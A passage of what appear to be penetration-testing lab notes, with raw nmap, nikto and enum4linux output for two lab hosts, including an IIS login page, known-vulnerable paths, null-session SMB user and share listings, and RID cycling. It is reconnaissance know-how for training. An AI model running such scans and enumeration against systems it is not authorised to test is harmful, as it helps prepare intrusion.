/>SF:px;background-image:url\(offsec-team\.jpg\);\&quot;&gt;\n&lt;form\x20method=\&quot;post<br />SF:\&quot;\x20action=\&quot;login\.asp\&quot;&gt;\n&lt;table\x20style=\&quot;padding-top:170px;\&quot;&gt;\n<br />SF:&lt;tr&gt;\n&lt;td&gt;Username:\x20&lt;/td&gt;&lt;td&gt;&lt;input\x20type=\&quot;text\&quot;\x20name=\&quot;usern<br />SF:ame\&quot;\x20value=\&quot;\&quot;&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;Password:\x20&lt;/td&gt;&lt;td&gt;&lt;inpu<br />SF:t\x20type=\&quot;password\&quot;\x20name=\&quot;password\&quot;&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td\x20<br />SF:colspan=\&quot;2\&quot;\x20align=\&quot;right\&quot;&gt;&lt;input\x20type=\&quot;submit\&quot;\x20name=\&quot;su<br />SF:bmit\&quot;\x20value=\&quot;Enter\&quot;&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n&lt;/ce<br />SF:nter&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(HTTPOptions,325,&quot;HTTP/1\.1\x20200\x20OK\r<br />SF:\nDate:\x20Mon,\x2011\x20May\x202020\x2020:31:03\x20GMT\r\nServer:\x20M<br />SF:icrosoft\x20IIS\x205\.6\r\nVary:\x20Accept-Encoding\r\nContent-Length:\<br />SF:x20619\r\nConnection:\x20close\r\nContent-Type:\x20text/html;\x20charse<br />SF:t=UTF-8\r\n\r\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Let&#39;s\x20play\x20with\x20the\x20o<br />SF:ffsec\x20team&lt;/title&gt;\n&lt;/head&gt;\n&lt;body\x20style=\&quot;color:\x20#FFFFFF;\x20<br />SF:background-color:\x20#000000;font-family:\x20verdana;\&quot;&gt;\n&lt;center&gt;\n&lt;di<br />SF:v\x20style=\&quot;width:600px;height:399px;background-image:url\(offsec-team<br />SF:\.jpg\);\&quot;&gt;\n&lt;form\x20method=\&quot;post\&quot;\x20action=\&quot;login\.asp\&quot;&gt;\n&lt;table<br />SF:\x20style=\&quot;padding-top:170px;\&quot;&gt;\n&lt;tr&gt;\n&lt;td&gt;Username:\x20&lt;/td&gt;&lt;td&gt;&lt;inp<br />SF:ut\x20type=\&quot;text\&quot;\x20name=\&quot;username\&quot;\x20value=\&quot;\&quot;&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;t<br />SF:r&gt;\n&lt;td&gt;Password:\x20&lt;/td&gt;&lt;td&gt;&lt;input\x20type=\&quot;password\&quot;\x20name=\&quot;pas<br />SF:sword\&quot;&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td\x20colspan=\&quot;2\&quot;\x20align=\&quot;right\&quot;&gt;&lt;in<br />SF:put\x20type=\&quot;submit\&quot;\x20name=\&quot;submit\&quot;\x20value=\&quot;Enter\&quot;&gt;&lt;/td&gt;\n&lt;/t<br />SF:r&gt;\n&lt;/table&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&quot;);<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 107.82 seconds<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 16:34 EDT<br />Nmap scan report for 10.11.1.133<br />Host is up (0.068s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 117.18 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host http://10.11.1.133:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.133<br />+ Target Hostname:    10.11.1.133<br />+ Target Port:        80<br />+ Start Time:         2020-05-11 16:39:31 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft IIS 5.6<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.asp<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ OSVDB-3092: /_vti_txt/: FrontPage directory found.<br />+ OSVDB-3092: /bak/: This might be interesting...<br />+ OSVDB-3092: /login/: This might be interesting...<br />+ OSVDB-3092: /test/: This might be interesting...<br />+ OSVDB-3233: /_vti_bin/: FrontPage directory found.<br />+ OSVDB-474: /Sites/Knowledge/Membership/Inspired/ViewCode.asp: The default ViewCode.asp can allow an attacker to read any file on the machine. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0737. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-013.<br />+ OSVDB-7: /iissamples/exair/howitworks/Code.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0449. BID-193.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /login.asp: Admin login page/section found.<br />+ OSVDB-3092: /test.asp: This might be interesting...<br />+ 8728 requests: 0 error(s) and 16 item(s) reported on remote host<br />+ End Time:           2020-05-11 16:51:27 (GMT-4) (716 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/></div><div class='page'><h1 class='title level-4'>10.11.1.136 Sufferance</h1><br/><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br />apt install ident-user-enum<br /><a href=""><img src="images/1055-1.png" alt="images/1055-1.png" /></a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.136 &amp;&amp; nmap -sC -sV -Pn 10.11.1.136 &amp;&amp; nmap -p- -Pn 10.11.1.136 &amp;&amp; nmap -Pn -p- -sU 10.11.1.136<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-13 07:44 EDT<br />Nmap scan report for 10.11.1.136<br />Host is up (0.068s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />113/tcp open  ident<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.09 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-13 07:44 EDT<br />Nmap scan report for 10.11.1.136<br />Host is up (0.056s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)<br />|_auth-owners: root<br />| ssh-hostkey: <br />|   1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA)<br />|_  2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA)<br />113/tcp open  ident<br />|_auth-owners: identd<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)<br />|_auth-owners: root<br />445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)<br />|_auth-owners: root<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 1h57m59s, deviation: 2h49m43s, median: -2m01s<br />|_nbstat: NetBIOS name: SUFFERANCE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.24)<br />|   NetBIOS computer name: <br />|   Workgroup: THINC.LOCAL\x00<br />|_  System time: 2020-05-13T07:42:39-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: share (dangerous)<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 17.02 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-13 07:44 EDT<br />Nmap scan report for 10.11.1.136<br />Host is up (0.070s latency).<br />Not shown: 65531 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />113/tcp open  ident<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 64.30 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br /></div><div class='page'><h1 class='title level-6'>Enum4Linux</h1><br/>enum4linux -a 10.11.1.136<br />Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 13 08:05:48 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.136<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> =================================================== <br />|    Enumerating Workgroup/Domain on 10.11.1.136    |<br /> =================================================== <br />[+] Got domain/workgroup name: THINC.LOCAL<br /><br /> =========================================== <br />|    Nbtstat Information for 10.11.1.136    |<br /> =========================================== <br />Looking up status of 10.11.1.136<br />	SUFFERANCE      &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	SUFFERANCE      &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	SUFFERANCE      &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	THINC.LOCAL     &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	THINC.LOCAL     &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	THINC.LOCAL     &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ==================================== <br />|    Session Check on 10.11.1.136    |<br /> ==================================== <br />[+] Server 10.11.1.136 allows sessions using username &#39;&#39;, password &#39;&#39;<br /><br /> ========================================== <br />|    Getting domain SID for 10.11.1.136    |<br /> ========================================== <br />Domain Name: THINC.LOCAL<br />Domain Sid: (NULL SID)<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ===================================== <br />|    OS information on 10.11.1.136    |<br /> ===================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 10.11.1.136 from smbclient: <br />[+] Got OS info for 10.11.1.136 from srvinfo:<br />	SUFFERANCE     Wk Sv PrQ Unx NT SNT sufferance debian server<br />	platform_id     :	500<br />	os version      :	4.9<br />	server type     :	0x809a03<br /><br /> ============================ <br />|    Users on 10.11.1.136    |<br /> ============================ <br />index: 0x1 RID: 0x3f2 acb: 0x00000010 Account: games	Name: games	Desc: (null)<br />index: 0x2 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)<br />index: 0x3 RID: 0x402 acb: 0x00000010 Account: proxy	Name: proxy	Desc: (null)<br />index: 0x4 RID: 0x42a acb: 0x00000010 Account: www-data	Name: www-data	Desc: (null)<br />index: 0x5 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)<br />index: 0x6 RID: 0x3fa acb: 0x00000010 Account: news	Name: news	Desc: (null)<br />index: 0x7 RID: 0x3ec acb: 0x00000010 Account: bin	Name: bin	Desc: (null)<br />index: 0x8 RID: 0x3f8 acb: 0x00000010 Account: mail	Name: mail	Desc: (null)<br />index: 0x9 RID: 0x3ea acb: 0x00000010 Account: daemon	Name: daemon	Desc: (null)<br />index: 0xa RID: 0x4b6 acb: 0x00000010 Account: sshd	Name: (null)	Desc: (null)<br />index: 0xb RID: 0x3f4 acb: 0x00000010 Account: man	Name: man	Desc: (null)<br />index: 0xc RID: 0x3f6 acb: 0x00000010 Account: lp	Name: lp	Desc: (null)<br />index: 0xd RID: 0x4b0 acb: 0x00000010 Account: Debian-exim	Name: (null)	Desc: (null)<br />index: 0xe RID: 0x43a acb: 0x00000010 Account: gnats	Name: Gnats Bug-Reporting System (admin)	Desc: (null)<br />index: 0xf RID: 0x42c acb: 0x00000010 Account: backup	Name: backup	Desc: (null)<br />index: 0x10 RID: 0x3ee acb: 0x00000010 Account: sys	Name: sys	Desc: (null)<br />index: 0x11 RID: 0xbba acb: 0x00000010 Account: bob	Name: (null)	Desc: (null)<br />index: 0x12 RID: 0x4b4 acb: 0x00000010 Account: identd	Name: (null)	Desc: (null)<br />index: 0x13 RID: 0x434 acb: 0x00000010 Account: list	Name: Mailing List Manager	Desc: (null)<br />index: 0x14 RID: 0x436 acb: 0x00000010 Account: irc	Name: ircd	Desc: (null)<br />index: 0x15 RID: 0x4b2 acb: 0x00000010 Account: statd	Name: (null)	Desc: (null)<br />index: 0x16 RID: 0x3f0 acb: 0x00000010 Account: sync	Name: sync	Desc: (null)<br />index: 0x17 RID: 0x3fc acb: 0x00000010 Account: uucp	Name: uucp	Desc: (null)<br /><br />user:[games] rid:[0x3f2]<br />user:[nobody] rid:[0x1f5]<br />user:[proxy] rid:[0x402]<br />user:[www-data] rid:[0x42a]<br />user:[root] rid:[0x3e8]<br />user:[news] rid:[0x3fa]<br />user:[bin] rid:[0x3ec]<br />user:[mail] rid:[0x3f8]<br />user:[daemon] rid:[0x3ea]<br />user:[sshd] rid:[0x4b6]<br />user:[man] rid:[0x3f4]<br />user:[lp] rid:[0x3f6]<br />user:[Debian-exim] rid:[0x4b0]<br />user:[gnats] rid:[0x43a]<br />user:[backup] rid:[0x42c]<br />user:[sys] rid:[0x3ee]<br />user:[bob] rid:[0xbba]<br />user:[identd] rid:[0x4b4]<br />user:[list] rid:[0x434]<br />user:[irc] rid:[0x436]<br />user:[statd] rid:[0x4b2]<br />user:[sync] rid:[0x3f0]<br />user:[uucp] rid:[0x3fc]<br /><br /> ======================================== <br />|    Share Enumeration on 10.11.1.136    |<br /> ======================================== <br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	IPC$            IPC       IPC Service (sufferance debian server)<br />	Bob Share       Disk      Bob Docs<br />	print$          Disk      Printer Drivers<br />Reconnecting with SMB1 for workgroup listing.<br /><br />	Server               Comment<br />	---------            -------<br />	SUFFERANCE           sufferance debian server<br /><br />	Workgroup            Master<br />	---------            -------<br />	MYGROUP              PHOENIX<br />	SECURITY             MAILMAN<br />	THINC                ALICE<br />	THINC.LOCAL          SUFFERANCE<br />	WORKGROUP            BOB<br /><br />[+] Attempting to map shares on 10.11.1.136<br />//10.11.1.136/IPC$	[E] Can&#39;t understand response:<br />do_list: [\*] NT_STATUS_NETWORK_ACCESS_DENIED<br />//10.11.1.136/print$	[E] Can&#39;t understand response:<br />tree connect failed: NT_STATUS_WRONG_PASSWORD<br /><br /> =================================================== <br />|    Password Policy Information for 10.11.1.136    |<br /> =================================================== <br /><br /><br />[+] Attaching to 10.11.1.136 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] SUFFERANCE<br />	[+] Builtin<br /><br />[+] Password Info for Domain: SUFFERANCE<br /><br />	[+] Minimum password length: 5<br />	[+] Password history length: None<br />	[+] Maximum password age: Not Set<br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: None<br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: Not Set<br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 0<br /><br /><br /> ============================= <br />|    Groups on 10.11.1.136    |<br /> ============================= <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ====================================================================== <br />|    Users on 10.11.1.136 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ====================================================================== <br />[I] Found new SID: S-1-5-21-1086716168-3792659489-4186792627<br />[I] Found new SID: S-1-5-32<br />[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-32-500 *unknown*\*unknown* (8)<br />S-1-5-32-501 *unknown*\*unknown* (8)<br />S-1-5-32-502 *unknown*\*unknown* (8)<br />S-1-5-32-503 *unknown*\*unknown* (8)<br />S-1-5-32-504 *unknown*\*unknown* (8)<br />S-1-5-32-505 *unknown*\*unknown* (8)<br />S-1-5-32-506 *unknown*\*unknown* (8)<br />S-1-5-32-507 *unknown*\*unknown* (8)<br />S-1-5-32-508 *unknown*\*unknown* (8)<br />S-1-5-32-509 *unknown*\*unknown* (8)<br />S-1-5-32-510 *unknown*\*unknown* (8)<br />S-1-5-32-511 *unknown*\*unknown* (8)<br />S-1-5-32-512 *unknown*\*unknown* (8)<br />S-1-5-32-513 *unknown*\*unknown* (8)<br />S-1-5-32-514 *unknown*\*unknown* (8)<br />S-1-5-32-515 *unknown*\*unknown* (8)<br />S-1-5-32-516 *unknown*\*unknown* (8)<br />S-1-5-32-517 *unknown*\*unknown* (8)<br />S-1-5-32-518 *unknown*\*unknown* (8)<br />S-1-5-32-519 *unknown*\*unknown* (8)<br />S-1-5-32-520 *unknown*\*unknown* (8)<br />S-1-5-32-521 *unknown*\*unknown* (8)<br />S-1-5-32-522 *unknown*\*unknown* (8)<br />S-1-5-32-523 *unknown*\*unknown* (8)<br />S-1-5-32-524 *unknown*\*unknown* (8)<br />S-1-5-32-525 *unknown*\*unknown* (8)<br />S-1-5-32-526 *unknown*\*unknown* (8)<br />S-1-5-32-527 *unknown*\*unknown* (8)<br />S-1-5-32-528 *unknown*\*unknown* (8)<br />S-1-5-32-529 *unknown*\*unknown* (8)<br />S-1-5-32-530 *unknown*\*unknown* (8)<br />S-1-5-32-531 *unknown*\*unknown* (8)<br />S-1-5-32-532 *unknown*\*unknown* (8)<br />S-1-5-32-533 *unknown*\*unknown* (8)<br />S-1-5-32-534 *unknown*\*unknown* (8)<br />S-1-5-32-535 *unknown*\*unknown* (8)<br />S-1-5-32-536 *unknown*\*unknown* (8)<br />S-1-5-32-537 *unknown*\*unknown* (8)<br />S-1-5-32-538 *unknown*\*unknown* (8)<br />S-1-5-32-539 *unknown*\*unknown* (8)<br />S-1-5-32-540 *unknown*\*unknown* (8)<br />S-1-5-32-541 *unknown*\*unknown* (8)<br />S-1-5-32-542 *unknown*\*unknown* (8)<br />S-1-5-32-543 *unknown*\*unknown* (8)<br />S-1-5-32-544 BUILTIN\Administrators (Local Group)<br />S-1-5-32-545 BUILTIN\Users (Local Group)<br />S-1-5-32-546 BUILTIN\Guests (Local Group)<br />S-1-5-32-547 BUILTIN\Power Users (Local Group)<br />S-1-5-32-548 BUILTIN\Account Operators (Local Group)<br />S-1-5-32-549 BUILTIN\Server Operators (Local Group)<br />S-1-5-32-550 BUILTIN\Print Operators (Local Group)<br />S-1-5-32-1000 *unknown*\*unknown* (8)<br />S-1-5-32-1001 *unknown*\*unknown* (8)<br />S-1-5-32-1002 *unknown*\*unknown* (8)<br />S-1-5-32-1003 *unknown*\*unknown* (8)<br />S-1-5-32-1004 *unknown*\*unknown* (8)<br />S-1-5-32-1005 *unknown*\*unknown* (8)<br />S-1-5-32-1006 *unknown*\*unknown* (8)<br />S-1-5-32-1007 *unknown*\*unknown* (8)<br />S-1-5-32-1008 *unknown*\*unknown* (8)<br />S-1-5-32-1009 *unknown*\*unknown* (8)<br />S-1-5-32-1010 *unknown*\*unknown* (8)<br />S-1-5-32-1011 *unknown*\*unknown* (8)<br />S-1-5-32-1012 *unknown*\*unknown* (8)<br />S-1-5-32-1013 *unknown*\*unknown* (8)<br />S-1-5-32-1014 *unknown*\*unknown* (8)<br />S-1-5-32-1015 *unknown*\*unknown* (8)<br />S-1-5-32-1016 *unknown*\*unknown* (8)<br />S-1-5-32-1017 *unknown*\*unknown* (8)<br />S-1-5-32-1018 *unknown*\*unknown* (8)<br />S-1-5-32-1019 *unknown*\*unknown* (8)<br />S-1-5-32-1020 *unknown*\*unknown* (8)<br />S-1-5-32-1021 *unknown*\*unknown* (8)<br />S-1-5-32-1022 *unknown*\*unknown* (8)<br />S-1-5-32-1023 *unknown*\*unknown* (8)<br />S-1-5-32-1024 *unknown*\*unknown* (8)<br />S-1-5-32-1025 *unknown*\*unknown* (8)<br />S-1-5-32-1026 *unknown*\*unknown* (8)<br />S-1-5-32-1027 *unknown*\*unknown* (8)<br />S-1-5-32-1028 *unknown*\*unknown* (8)<br />S-1-5-32-1029 *unknown*\*unknown* (8)<br />S-1-5-32-1030 *unknown*\*unknown* (8)<br />S-1-5-32-1031 *unknown*\*unknown* (8)<br />S-1-5-32-1032 *unknown*\*unknown* (8)<br />S-1-5-32-1033 *unknown*\*unknown* (8)<br />S-1-5-32-1034 *unknown*\*unknown* (8)<br />S-1-5-32-1035 *unknown*\*unknown* (8)<br />S-1-5-32-1036 *unknown*\*unknown* (8)<br />S-1-5-32-1037 *unknown*\*unknown* (8)<br />S-1-5-32-1038 *unknown*\*unknown* (8)<br />S-1-5-32-1039 *unknown*\*unknown* (8)<br />S-1-5-32-1040 *unknown*\*unknown* (8)<br />S-1-5-32-1041 *unknown*\*unknown* (8)<br />S-1-5-32-1042 *unknown*\*unknown* (8)<br />S-1-5-32-1043 *unknown*\*unknown* (8)<br />S-1-5-32-1044 *unknown*\*unknown* (8)<br />S-1-5-32-1045 *unknown*\*unknown* (8)<br />S-1-5-32-1046 *unknown*\*unknown* (8)<br />S-1-5-32-1047 *unknown*\*unknown* (8)<br />S-1-5-32-1048 *unknown*\*unknown* (8)<br />S-1-5-32-1049 *unknown*\*unknown* (8)<br />S-1-5-32-1050 *unknown*\*unknown* (8)<br />[+] Enumerating users using SID S-1-5-21-1086716168-3792659489-4186792627 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-21-1086716168-3792659489-4186792627-500 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-501 SUFFERANCE\nobody (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-502 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-503 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-504 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-505 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-506 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-507 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-508 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-509 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-510 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-511 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-512 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-513 SUFFERANCE\None (Domain Group)<br />S-1-5-21-1086716168-3792659489-4186792627-514 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-515 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-516 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-517 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-518 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-519 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-520 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-521 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-522 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-523 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-524 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-525 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-526 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-527 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-528 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-529 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-530 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-531 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-532 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-533 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-534 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-535 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-536 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-537 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-538 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-539 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-540 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-541 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-542 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-543 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-544 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-545 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-546 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-547 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-548 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-549 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-550 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1000 SUFFERANCE\root (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1001 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1002 SUFFERANCE\daemon (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1003 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1004 SUFFERANCE\bin (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1005 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1006 SUFFERANCE\sys (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1007 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1008 SUFFERANCE\sync (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1009 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1010 SUFFERANCE\games (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1011 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1012 SUFFERANCE\man (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1013 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1014 SUFFERANCE\lp (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1015 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1016 SUFFERANCE\mail (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1017 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1018 SUFFERANCE\news (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1019 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1020 SUFFERANCE\uucp (Local User)<br />S-1-5-21-1086716168-3792659489-4186792627-1021 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1022 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1023 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1024 *unknown*\*unknown* (8)<br />S-1-5-21-1086716168-3792659489-4186792627-1025 *unknown*\*unknown* (8)<br 